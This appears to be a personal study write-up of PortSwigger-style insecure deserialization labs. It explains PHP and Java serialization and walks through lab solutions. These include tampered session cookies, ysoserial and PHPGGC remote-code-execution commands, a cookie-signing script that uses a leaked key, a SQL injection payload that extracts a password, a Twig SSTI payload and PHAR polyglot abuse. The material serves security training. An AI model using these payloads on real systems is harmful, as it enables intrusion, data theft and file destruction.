# Insecure deserialization

## Serialization

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:

- Write complex data to inter-process memory, a file, or a database
- Send complex data, for example, over a network, between different components of an application, or in an API call

Serialization may be referred as:

-  marshalling (Ruby)
- pickling (Python)

**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.

# Exploiting insecure deserialization vulnerabilities

## PHP serialization format

PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes:

```
$user->name = "carlos";
$user->isLoggedIn = true;
```

When serialized, this object may look something like this:

```O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}```

This can be interpreted as follows:

- *O:4:"User"* - An object with the 4-character class name "User"
- *2* - the object has 2 attributes
- *s:4:"name"* - The key of the first attribute is the 4-character string "name"
- *s:6:"carlos"* - The value of the first attribute is the 6-character string "carlos"
- *s:10:"isLoggedIn"* - The key of the second attribute is the 10-character string "isLoggedIn"
- *b:1* - The value of the second attribute is the boolean value true

## Java serialization format

 Java use binary serialization formats. Serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.

Any class that implements the interface *java.io.Serializable* can be serialized and deserialized. If you have source code access, take note of any code that uses the *readObject()* method, which is used to read and deserialize data from an InputStream.

## Modifying object attributes

If an attacker spotted this serialized object in an HTTP request, they might decode it to find the following byte stream:

```O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}```

The *isAdmin *attribute is an obvious point of interest. An attacker could simply change the boolean value of the attribute to 1 (true), re-encode the object, and overwrite their current cookie with this modified value. In isolation, this has no effect. However, let's say the website uses this cookie to check whether the current user has access to certain administrative functionality:

```
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```

### Modifying serialized objects

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges.

**Solution**

1. Log in using your own credentials. Notice that the post-login *GET /my-account* request contains a session cookie that appears to be URL and Base64-encoded.
2. Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The admin attribute contains *b:0*, indicating the boolean value *false*. Send this request to Burp Repeater.
3. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the *admin* attribute to *b:1*. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
4. Send the request. Notice that the response now contains a link to the admin panel at */admin*, indicating that you have accessed the page with admin privileges.
5. Change the path of your request to */admin* and resend it. Notice that the */admin* page contains links to delete specific user accounts.
6. Change the path of your request to */admin/delete?username=carlos* and send the request to solve the lab.

## Modifying data types

PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (==) when comparing different data types. For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that 5 == "5" evaluates to true.

This could potentially result in dangerous logic flaws.

```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

### Modifying serialized data types

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. 

**Solution**

1. Log in using your own credentials. In Burp, open the post-login *GET /my-account* request and examine the session cookie using the Inspector to reveal a serialized PHP object. Send this request to Burp Repeater.
2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows:

- Update the length of the *username* attribute to *13*.
- Change the username to *administrator*.
- Change the access token to the integer 0. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
- Update the data type label for the access token by replacing s with i.

    The result should look like this:

    *O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}*

3. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
4. Send the request. Notice that the response now contains a link to the admin panel at */admin*, indicating that you have successfully accessed the page as the *administrator* user.
5. Change the path of your request to */admin* and resend it. Notice that the /admin page contains links to delete specific user accounts.
6. Change the path of your request to */admin/delete?username=carlos* and send the request to solve the lab.

## Using application functionality

For example, as part of a website's "Delete user" functionality, the user's profile picture is deleted by accessing the file path in the *$user->image_location* attribute. If this $user was created from a serialized object, an attacker could exploit this by passing in a modified object with the *image_location* set to an arbitrary file path. Deleting their own user account would then delete this arbitrary file as well.

### Using application functionality to exploit insecure deserialization

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

**Solution**

1. Log in to your own account. On the "My account" page, notice the option to delete your account by sending a POST request to */my-account/delete*.
2. Send a request containing a session cookie to Burp Repeater.
3. In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an *avatar_link* attribute, which contains the file path to your avatar.
4. Edit the serialized data so that the *avatar_link* points to */home/carlos/morale.txt*. Remember to update the length indicator. The modified attribute should look like this:

    ```s:11:"avatar_link";s:23:"/home/carlos/morale.txt"```

5. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
6. Change the request line to *POST /my-account/delete* and send the request. Your account will be deleted, along with Carlos's *morale.txt* file.

## Magic methods

Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. 

One of the most common examples:
- in PHP is ```__construct()```
- in Python is ```__init__```
- in Java is ```ObjectInputStream.readObject()```

## Injecting arbitrary objects

Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. 

### Arbitrary object injection in PHP

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access.

**Solution**

1. Log in to your own account and notice the session cookie contains a serialized PHP object.
2. From the site map, notice that the website references the file */libs/CustomTemplate.php*. Right-click on the file and select "Send to Repeater".
3. In Burp Repeater, notice that you can read the source code by appending a tilde (~) to the filename in the request line.

    ```GET /libs/CustomTemplate.php~ HTTP/1.1```

4. In the source code, notice the CustomTemplate class contains the *__destruct()* magic method. This will invoke the *unlink()* method on the *lock_file_path* attribute, which will delete the file on this path.
5. In Burp Decoder, use the correct syntax for serialized PHP data to create a *CustomTemplate* object with the *lock_file_path* attribute set to */home/carlos/morale.txt*. Make sure to use the correct data type labels and length indicators. The final object should look like this:

    ```O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}```

6. Base64 and URL-encode this object and save it to your clipboard.
7. Send a request containing the session cookie to Burp Repeater.
8. In Burp Repeater, replace the session cookie with the modified one in your clipboard.
9. Send the request. The *__destruct()* magic method is automatically invoked and will delete Carlos's file.

## Gadget chains

The attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage.

## Working with pre-built gadget chains

**Ysoserial**

Tool for Java deserialization. This lets you choose one of the provided gadget chains for a library that you think the target application is using, then pass in a command that you want to execute. It then creates an appropriate serialized object based on the selected chain. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually.

### Exploiting Java deserialization with Apache Commons

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.
To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

**Solution**

1. Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
2. Download the "ysoserial" tool and execute the following command:

    ```java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64```

    This will generate a Base64-encoded serialized object containing your payload.
3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
4. Send the request to solve the lab.

This lab doesnot work with java 17 version.
- Check Java version installed:

    ```/usr/libexec/java_home -V```

- then use old version:

    ```export JAVA_HOME=$(/usr/libexec/java_home -v 15.0.2)```

- checkk Java version:

    ```java -version```

## PHP Generic Gadget Chains

Most languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. PHP-based sites you can use "PHP Generic Gadget Chains" (PHPGGC).

### Exploiting PHP deserialization with a pre-built gadget chain

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

Identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

**Solution**

1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the **Inspector** panel.
2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
3. Copy the decoded cookie from the **Inspector** and paste it into Decoder.
4. In Decoder, highlight the token and then select **Decode as > Base64**. Notice that the token is actually a serialized PHP object.
5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:
    - A developer comment discloses the location of a debug file at */cgi-bin/phpinfo.php*.
    - The error message reveals that the website is using the *Symfony 4.3.6 framework*.
6. Request the */cgi-bin/phpinfo.php* file in Burp Repeater and observe that it leaks some key information about the website, including the *SECRET_KEY* environment variable. Save this key; you'll need it to sign your exploit later.

    ```SECRET_KEY = f7174phfqyx4laur0xgpipgj8juxo4ri ```

7. Download the "PHPGGC" tool and execute the following command:

    ```./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64```

    This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's *morale.txt* file.
8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
    - Assign the object you generated in PHPGGC to the *$object* variable.
    - Assign the secret key that you copied from the *phpinfo.php* file to the *$secretKey* variable.

    ```
    <?php
    $object = "OBJECT-GENERATED-BY-PHPGGC";
    $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
    $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
    echo $cookie;
    ```

    This will output a valid, signed cookie to the console.
9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.

Use this online compiler ```https://onecompiler.com/php/3y2n7vj5t```

```
<?php

/* ./phpggc Symfony/RCE4 exec "rm /home/carlos/morale.txt" -b */

$object = 'Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==';

$secretKey = 'f7174phfqyx4laur0xgpipgj8juxo4ri';

echo $payload = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

?>
```

### Exploiting Ruby deserialization using a documented gadget chain

This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

Find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

**Solution**

1. Log in to your own account and notice that the session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater.
2. Browse the web to find the *Universal Deserialisation Gadget for Ruby 2.x-3.x* by *vakzz* on *devcraft.io*. Copy the final script for generating the payload.
3. Modify the script as follows:
    - Change the command that should be executed from *id* to *rm /home/carlos/morale.txt*.
    - Replace the final two lines with *puts Base64.encode64(payload)*. This ensures that the payload is output in the correct format for you to use for the lab.
4. Run the script and copy the resulting Base64-encoded object.
5. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
6. Send the request to solve the lab.

Both files 1-Ruby works.

## Creating your own exploit

### Developing a custom gadget chain for Java deserialization

This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.
To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password.

**Solution**

1. Log in to your own account and notice the session cookie contains a serialized Java object.
2. From the site map, notice that the website references the file */backup/AccessTokenUser.java*. You can successfully request this file in Burp Repeater.
3. Navigate upward to the */backup* directory and notice that it also contains a *ProductTemplate.java file*.
4. Notice that the *ProductTemplate.readObject()* method passes the template's id attribute into a SQL statement.
5. Based on the leaked source code, write a small Java program that instantiates a *ProductTemplate* with an arbitrary ID, serializes it, and then Base64-encodes it.
6. Use template in folder serialization-examples -> java -> solution -> Main.java
6. Use your Java program to create a ProductTemplate with the id set to a single apostrophe. Copy the Base64 string and submit it in a request as your session cookie. The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialized object.
7. In terminal write javac Main.java and then java Main
    ```
    Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
    Deserialized object ID: '
    ```
8. Use a suitable SQL injection payload to extract the password from the users table. For example, the following payload will trigger an exception that displays the password in the error message:

    ```' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--```

9. Encode as URL.

    ```%72%4f%30%41%42%58%4e%79%41%43%4e%6b%59%58%52%68%4c%6e%42%79%62%32%52%31%59%33%52%6a%59%58%52%68%62%47%39%6e%4c%6c%42%79%62%32%52%31%59%33%52%55%5a%57%31%77%62%47%46%30%5a%51%41%41%41%41%41%41%41%41%41%42%41%67%41%42%54%41%41%43%61%57%52%30%41%42%4a%4d%61%6d%46%32%59%53%39%73%59%57%35%6e%4c%31%4e%30%63%6d%6c%75%5a%7a%74%34%63%48%51%41%58%79%63%67%56%55%35%4a%54%30%34%67%55%30%56%4d%52%55%4e%55%49%45%35%56%54%45%77%73%49%45%35%56%54%45%77%73%49%45%35%56%54%45%77%73%49%45%4e%42%55%31%51%6f%63%47%46%7a%63%33%64%76%63%6d%51%67%51%56%4d%67%62%6e%56%74%5a%58%4a%70%59%79%6b%73%49%45%35%56%54%45%77%73%49%45%35%56%54%45%77%73%49%45%35%56%54%45%77%73%49%45%35%56%54%45%77%67%52%6c%4a%50%54%53%42%31%63%32%56%79%63%79%30%74```
10. Response: 

    ```
    <p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;wka982beseaoa277h9d4&quot;</p>
    ```
    administrator: wka982beseaoa277h9d4

### Developing a custom gadget chain for PHP deserialization

This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos's home directory.

**Solution**
1. Log in to your own account and notice that the session cookie contains a serialized PHP object. Notice that the website references the file */cgi-bin/libs/CustomTemplate.php*. Obtain the source code by submitting a request using the *.php~* backup file extension.
2. In the source code, notice that the *__wakeup()* magic method for a CustomTemplate will create a new Product by referencing the default_desc_type and desc from the CustomTemplate.
3. Also notice that the DefaultMap class has the *__get()* magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes call_user_func(), which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name, which is the non-existent attribute that was requested.
4. You can exploit this gadget chain to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where:

    ```
    CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
    CustomTemplate->desc = DefaultMap;
    DefaultMap->callback = "exec"
    ```

    If you follow the data flow in the source code, you will notice that this causes the Product constructor to try and fetch the default_desc_type from the DefaultMap object. As it doesn't have this attribute, the *__get()* method will invoke the callback exec() method on the default_desc_type, which is set to our shell command.
5. To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie, decode as Base64:

    ```O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}```

    Encode as Base64:

    ```TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319```

    then encode as URL:

    ```%54%7a%6f%78%4e%44%6f%69%51%33%56%7a%64%47%39%74%56%47%56%74%63%47%78%68%64%47%55%69%4f%6a%49%36%65%33%4d%36%4d%54%63%36%49%6d%52%6c%5a%6d%46%31%62%48%52%66%5a%47%56%7a%59%31%39%30%65%58%42%6c%49%6a%74%7a%4f%6a%49%32%4f%69%4a%79%62%53%41%76%61%47%39%74%5a%53%39%6a%59%58%4a%73%62%33%4d%76%62%57%39%79%59%57%78%6c%4c%6e%52%34%64%43%49%37%63%7a%6f%30%4f%69%4a%6b%5a%58%4e%6a%49%6a%74%50%4f%6a%45%77%4f%69%4a%45%5a%57%5a%68%64%57%78%30%54%57%46%77%49%6a%6f%78%4f%6e%74%7a%4f%6a%67%36%49%6d%4e%68%62%47%78%69%59%57%4e%72%49%6a%74%7a%4f%6a%51%36%49%6d%56%34%5a%57%4d%69%4f%33%31%39```

## PHAR deserialization

PHP provides several URL-style wrappers that you can use for handling different protocols when accessing file paths. One of these is the phar:// wrapper, which provides a stream interface for accessing PHP Archive (.phar) files.

### Using PHAR deserialization to deploy a custom gadget chain

**Solution**

1. Observe that the website has a feature for uploading your own avatar, which only accepts JPG images. Upload a valid JPG as your avatar. Notice that it is loaded using ```GET /cgi-bin/avatar.php?avatar=wiener```.
2. In Burp Repeater, request GET /cgi-bin to find an index that shows a Blog.php and CustomTemplate.php file. Obtain the source code by requesting the files using the .php~ backup extension.
3. Study the source code and identify the gadget chain involving the Blog->desc and CustomTemplate->lockFilePath attributes.
4. Notice that the file_exists() filesystem method is called on the lockFilePath attribute.
5. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file:

    ```{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}```

6. Write a some PHP for creating a CustomTemplate and Blog containing your SSTI payload:

    ```
    class CustomTemplate {}
    class Blog {}
    $object = new CustomTemplate;
    $blog = new Blog;
    $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
    $blog->user = 'user';
    $object->template_file_path = $blog;
    ```

7. Create a PHAR-JPG polyglot containing your PHP script. You can find several scripts for doing this online (search for "phar jpg polyglot"). Alternatively, you can download our ready-made one.
8. Upload this file as your avatar.
9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a phar:// stream as follows:

    ```GET /cgi-bin/avatar.php?avatar=phar://wiener```

10. Send the request to solve the lab.